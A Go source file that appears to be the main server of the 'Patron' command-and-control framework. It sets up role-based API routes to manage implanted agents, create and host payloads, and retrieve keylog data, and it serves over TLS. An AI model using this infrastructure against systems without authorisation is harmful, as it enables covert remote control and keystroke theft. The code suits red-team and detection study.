package main

import (
    "net/http"
    "path/filepath"
    "os"
    "strings"

    "github.com/PatronC2/Patron/api/server"
    "github.com/PatronC2/Patron/lib/logger"
    "github.com/gin-gonic/gin"
)

func main() {
    server.OpenDatabase()
    server.InitDatabase()
    server.CreateAdminUser()
    
    gin.SetMode(gin.ReleaseMode)
    r := gin.Default()

    // host payloads server
    workDir, _ := os.Getwd()
	filesDir := http.Dir(filepath.Join(workDir, "agents"))
    FileServer(r, "/files", filesDir)

    // handle logins
    r.POST("/login", server.LoginHandler)

    readRoles := []string{"admin", "operator", "readOnly"}
    writeRoles := []string{"admin", "operator"}
    adminRoles := []string{"admin"}

    // Admin functions
    r.POST("/api/admin/users", server.Auth(adminRoles), server.CreateUserHandler)
    r.DELETE("/api/admin/users/:username", server.Auth(adminRoles), server.DeleteUserByUsernameHandler)

    // POST / DELETE requests to non-admin areas use Auth(writeRoles)
    r.POST("/api/updateagent/:agt", server.Auth(writeRoles), server.UpdateAgentHandler)
    r.GET("/api/deleteagent/:agt", server.Auth(writeRoles), server.KillAgentHandler)
    r.POST("/api/payload", server.Auth(writeRoles), server.CreatePayloadHandler)

    // GET requests to non-admin areas use Auth(readRoles)
    r.GET("/api/agents", server.Auth(readRoles), server.GetAgentsHandler)
    r.GET("/api/groupagents", server.Auth(readRoles), server.GetGroupAgents)
    r.GET("/api/groupagents/:ip", server.Auth(readRoles), server.GetGroupAgentsByIP)
    r.GET("/api/oneagent/:agt", server.Auth(readRoles), server.GetOneAgentByUUID)
    r.GET("/api/agent/:agt", server.Auth(readRoles), server.GetAgentByUUID)
    r.GET("/api/keylog/:agt", server.Auth(readRoles), server.GetKeylogHandler)
    r.GET("/api/payloads", server.Auth(readRoles), server.GetPayloadsHandler)


    // Replace with your paths to the certificate and key files
    certFile := "certs/server.pem"
    keyFile := "certs/server.key"

    // Use RunTLS to enable SSL
    if err := r.RunTLS(":8443", certFile, keyFile); err != nil {
        logger.Logf(logger.Error, "Failed to run server: %v\n", err)
    }
}

func FileServer(r *gin.Engine, path string, root http.FileSystem) {
	if strings.ContainsAny(path, "{}*") {
		panic("FileServer does not permit any URL parameters.")
	}

	if path != "/" && path[len(path)-1] != '/' {
		r.GET(path, func(c *gin.Context) {
			c.Redirect(http.StatusMovedPermanently, path+"/")
		})
		path += "/"
	}
	r.StaticFS(path, root)
}
